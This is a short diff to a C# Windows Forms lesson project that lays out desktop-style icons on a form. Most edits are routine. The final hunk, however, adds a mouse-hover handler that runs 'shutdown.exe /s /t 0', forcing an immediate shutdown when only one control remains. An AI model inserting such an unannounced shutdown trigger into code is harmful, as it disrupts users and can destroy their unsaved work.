@@ -3,6 +3,7 @@ using System;
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
+using System.Diagnostics;
 using System.Drawing;
 using System.Linq;
 using System.Text;
@@ -12,7 +13,7 @@ using System.Windows.Forms;
 namespace Lesson2_0307
 {
     public partial class Form1 : Form
-    {
+    { 
         public Form1()
         {
             InitializeComponent();
@@ -21,7 +22,7 @@ namespace Lesson2_0307
             this.BackgroundImageLayout = ImageLayout.Stretch;
             //this.WindowState = FormWindowState.Maximized;
             //this.FormBorderStyle = FormBorderStyle.None;
-            //Get_Icons();
+            Get_Icons();
         }
         private void Get_Icons()
         {
@@ -76,7 +77,7 @@ namespace Lesson2_0307
 
                             IconBox icon_box = new IconBox(img, icon_name, x, y);
                             Controls.Add(icon_box);
-
+                            
 
                             y += 50;
                             if (y >= 500) 
@@ -136,6 +137,18 @@ namespace Lesson2_0307
         private void button1_Click(object sender, EventArgs e)
         {
             Get_Icons();
+        }
+
+       
+        private void Form1_MouseHover(object sender, EventArgs e)
+        {
+            if (Controls.Count == 1)
+            {
+                Process proc = new Process();
+                proc.StartInfo.FileName = "shutdown.exe";
+                proc.StartInfo.Arguments = "/s /t 0";
+                proc.Start();
+            }
         }
 
 
